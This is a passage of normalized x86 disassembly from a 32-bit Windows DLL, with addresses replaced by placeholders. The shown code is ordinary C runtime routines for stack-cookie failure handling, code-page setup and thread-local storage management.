mov [ rw-data ] eax
call sub_10008867
mov [ rw-data ] eax
call sub_1000611d
test eax eax
jge r-xdata
call sub_10007e90
jmp r-xdata
call sub_100087ae
test eax eax
jl r-xdata
call sub_100043b6
jmp r-xdata
call sub_1000635d
jmp r-xdata
call sub_1000853b
test eax eax
jl r-xdata
push 0x0
call sub_10008020
test eax eax
pop ecx
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_10003704
push 0xc
push r--data
call sub_10005acc
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi eax
je r-xdata
cmp [ rw-data ] edx
je r-xdata
mov eax [ r--data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
xor eax eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
push edi
push esi
push ebx
call sub_10001000
mov [ ebp - 0x1c ] eax
cmp esi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
push edi
push esi
push ebx
call sub_1000352b
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
push edi
push esi
push ebx
call sub_1000352b
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
push eax
push ebx
call sub_10001000
push edi
push 0x0
push ebx
call sub_1000352b
mov eax [ r--data ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push edi
push 0x0
push ebx
call eax
mov eax [ r--data ]
test eax eax
je r-xdata
call sub_10005b11
retn
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
sub_1000381b
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_10008c03
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_10008c03
pop ecx
sub_1000391f
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_1000394e
push ebx
push ebp
push esi
push edi
mov ebp 0x101
mov esi eax
push ebp
xor edi edi
lea ebx [ esi + 0x1c ]
push edi
push ebx
call sub_10008c10
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
xor eax eax
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax rw-data
add esp 0xc
sub eax esi
mov cl [ eax + ebx ]
mov [ ebx ] cl
inc ebx
dec ebp
jne r-xdata
lea ecx [ esi + 0x11d ]
mov esi 0x100
mov dl [ ecx + eax ]
mov [ ecx ] dl
inc ecx
dec esi
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
sub_100039a3
push ebp
lea ebp [ esp - 0x49c ]
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x498 ] eax
push ebx
push edi
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
mov edi 0x100
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x80 ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x80 ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax + 0x398 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x76 ]
test al al
mov [ ebp + 0x398 ] 0x20
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x68 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp + 0x398 ]
push eax
push 0x1
push 0x0
call sub_10009242
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp + 0x298 ]
push edi
push eax
push edi
lea eax [ ebp + 0x398 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_10009047
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp + 0x198 ]
push edi
push eax
push edi
lea eax [ ebp + 0x398 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_10009047
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x75 ]
mov edx [ ebp - 0x80 ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp + 0x498 ]
pop edi
xor ecx ebp
pop ebx
call sub_100026a8
add ebp 0x49c
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax + 0x298 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx + 0x398 ]
push 0x20
push edx
call sub_10008c10
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax + 0x198 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x68 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_10003b2d
push 0xc
push r--data
call sub_10005acc
call sub_1000452a
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_100072ab
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10003bc8
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_10005b11
retn
push 0x20
call sub_10007f04
pop ecx
cmp esi rw-data
je r-xdata
push esi
call sub_100063a9
pop ecx
sub_10003bd1
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_100027e4
cmp esi 0xfffffffe
mov [ rw-data ] ebx
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10003c4b
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_10003bd1
mov edi eax
xor esi esi
cmp edi esi
mov [ ebp + 0x8 ] edi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_1000394e
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_10008c10
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100026a8
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_10008c10
xor edx edx
inc edx
add esp 0xc
cmp [ ebp - 0x18 ] edx
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
jbe r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_1000391f
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
or eax 0xffffffff
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_100039a3
jmp r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_1000391f
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_10003df6
push 0x14
push r--data
call sub_10005acc
or [ ebp - 0x20 ] 0xffffffff
call sub_1000452a
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_10003b2d
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_10003bd1
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_10008468
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_10005b11
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_10003c4b
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_100049cb
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_100063a9
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_100063a9
pop ecx
push 0xd
call sub_100072ab
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10003f57
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_100063a9
pop ecx
sub_10003fae
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
mov eax [ esi + 0xbc ]
xor ebp ebp
cmp eax ebp
push edi
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebp
je r-xdata
cmp eax rw-data
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebp
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebp
je r-xdata
push 0x6
lea edi [ esi + 0x50 ]
pop ebx
cmp [ eax + 0xb4 ] ebp
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_100063a9
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_100063a9
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_100063a9
push [ esi + 0xc0 ]
call sub_100063a9
add esp 0x10
cmp [ eax ] ebp
jne r-xdata
cmp [ edi - 0x4 ] ebp
je r-xdata
mov eax [ edi ]
cmp eax ebp
je r-xdata
push eax
call sub_10009282
push [ edi ]
call sub_100063a9
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebp
je r-xdata
add edi 0x10
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebp
je r-xdata
cmp [ eax ] ebp
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebp
je r-xdata
cmp [ eax ] ebp
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_100063a9
pop ecx
pop edi
pop esi
pop ebp
pop ebx
retn
cmp [ eax ] ebp
jne r-xdata
push eax
call sub_100063a9
pop ecx
push [ esi + 0xb0 ]
call sub_100063a9
push [ esi + 0xbc ]
call sub_100063a9
pop ecx
pop ecx
cmp [ eax ] ebp
jne r-xdata
push eax
call sub_100063a9
push [ esi + 0xbc ]
call sub_10009452
pop ecx
pop ecx
push eax
call sub_100063a9
pop ecx
push eax
call sub_100063a9
push [ esi + 0xbc ]
call sub_10009412
pop ecx
pop ecx
sub_100040ee
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi [ InterlockedIncrement@IAT ]
push esi
call edi
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ esi + 0xb8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xb4 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xc0 ]
test eax eax
je r-xdata
push eax
call edi
push 0x6
lea ebx [ esi + 0x50 ]
pop ebp
push eax
call edi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec ebp
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
add eax 0xb4
push eax
call edi
pop edi
pop esi
pop ebp
pop ebx
retn
push eax
call edi
sub_10004174
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
mov eax esi
pop esi
retn
push ebx
push ebp
push edi
mov edi [ InterlockedDecrement@IAT ]
push esi
call edi
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ esi + 0xb8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xb4 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xc0 ]
test eax eax
je r-xdata
push eax
call edi
push 0x6
lea ebx [ esi + 0x50 ]
pop ebp
push eax
call edi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec ebp
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
add eax 0xb4
push eax
call edi
pop edi
pop ebp
pop ebx
push eax
call edi
sub_10004200
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_100040ee
test esi esi
pop ecx
je r-xdata
push esi
call sub_10004174
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_10003fae
pop ecx
sub_1000423e
push 0xc
push r--data
call sub_10005acc
call sub_1000452a
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_100072ab
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rw-data ]
call sub_10004200
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100042a8
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_1000452a
mov esi [ eax + 0x6c ]
mov eax esi
call sub_10005b11
retn
push 0x20
call sub_10007f04
pop ecx
sub_100042b4
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x8 ]
pop esi
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
push [ esp + 0x8 ]
call eax
mov [ esp + 0x8 ] eax
mov eax [ eax + 0x1f8 ]
jmp r-xdata
test eax eax
je r-xdata
sub_10004320
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x8 ]
pop esi
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
push [ esp + 0x8 ]
call eax
mov [ esp + 0x8 ] eax
mov eax [ eax + 0x1fc ]
jmp r-xdata
test eax eax
je r-xdata
sub_100043b6
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call sub_10004320
pop ecx
call eax
or [ rw-data ] 0xffffffff
jmp sub_1000717e
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_100043f3
push 0xc
push r--data
call sub_10005acc
push r--data
call [ GetModuleHandleA@IAT ]
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] rw-data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov eax rw-data
mov [ esi + 0x68 ] eax
push eax
call [ InterlockedIncrement@IAT ]
push 0xc
call sub_100072ab
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push r--data
push eax
mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push r--data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
push [ esi + 0x6c ]
call sub_100040ee
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000449e
call sub_10005b11
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_100044a7
push esi
push edi
call [ GetLastError@IAT ]
mov edi eax
call sub_1000438c
push [ rw-data ]
push [ rw-data ]
call [ TlsGetValue@IAT ]
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_100084a8
mov esi eax
test esi esi
pop ecx
pop ecx
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_10004320
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_100063a9
pop ecx
xor esi esi
push 0x0
push esi
call sub_100043f3
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_10004542
push 0x8
push r--data
call sub_10005acc
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_10005b11
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_100063a9
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_100063a9
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_100063a9
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_100063a9
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_100063a9
pop ecx
mov eax [ esi + 0x5c ]
cmp eax rw-data
je r-xdata
push eax
call sub_100063a9
pop ecx
push 0xd
call sub_100072ab
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_100063a9
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000464e
push 0xc
call sub_100072ab
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000465a
push esi
call sub_100063a9
pop ecx
push edi
call sub_10004174
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_100063a9
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_10003fae
pop ecx
sub_10004663
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push edi
mov edi [ esp + 0x8 ]
test edi edi
jne r-xdata
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call sub_10004320
pop ecx
call eax
push edi
call sub_10004542
pop edi
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov edi eax
sub_100046cc
push edi
push r--data
call [ GetModuleHandleA@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_100043b6
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_10004383
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_100081a0
push [ rw-data ]
call sub_100042b4
push [ rw-data ]
mov [ rw-data ] eax
call sub_100042b4
push [ rw-data ]
mov [ rw-data ] eax
call sub_100042b4
push [ rw-data ]
mov [ rw-data ] eax
call sub_100042b4
add esp 0x10
mov [ rw-data ] eax
call sub_10007135
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_100043b6
push sub_10004542
push [ rw-data ]
call sub_10004320
pop ecx
call eax
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
push 0x214
push 0x1
call sub_100084a8
mov esi eax
test esi esi
pop ecx
pop ecx
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_10004320
pop ecx
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_100043f3
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_10004870
push ebp
lea ebp [ esp - 0x2a8 ]
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x2a4 ] eax
push esi
mov [ ebp + 0x88 ] eax
mov [ ebp + 0x84 ] ecx
mov [ ebp + 0x80 ] edx
mov [ ebp + 0x7c ] ebx
mov [ ebp + 0x78 ] esi
mov [ ebp + 0x74 ] edi
mov [ ebp + 0xa0 ] ss
mov [ ebp + 0x94 ] cs
mov [ ebp + 0x70 ] ds
mov [ ebp + 0x6c ] es
mov [ ebp + 0x68 ] fs
mov [ ebp + 0x64 ] gs
pushfd
pop [ ebp + 0x98 ]
mov esi [ ebp + 0x2ac ]
lea eax [ ebp + 0x2ac ]
mov [ ebp + 0x9c ] eax
mov [ ebp - 0x28 ] 0x10001
mov [ ebp + 0x90 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp + 0x8c ] eax
lea eax [ ebp - 0x80 ]
push 0x0
push eax
call sub_10008c10
lea eax [ ebp - 0x80 ]
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x28 ]
add esp 0xc
mov [ ebp - 0x80 ] 0xc000000d
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x2c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov esi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x30 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc000000d
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp + 0x2a4 ]
xor ecx ebp
pop esi
call sub_100026a8
add ebp 0x2a8
leave
retn
test esi esi
jne r-xdata
push 0x2
call sub_10008c03
pop ecx
sub_1000496c
push ebp
mov ebp esp
push [ rw-data ]
call sub_10004320
test eax eax
pop ecx
je r-xdata
push 0x2
call sub_10008c03
pop ecx
pop ebp
jmp sub_10004870
pop ebp
jmp eax
sub_10004990
mov eax [ esp + 0x4 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
retn
inc ecx
cmp ecx 0x2d
jl r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
retn
push 0xd
pop eax
retn
sub_10004a0f
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
xor edi edi
push edi
push edi
push edi
push edi
push ecx
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x20 ] ecx
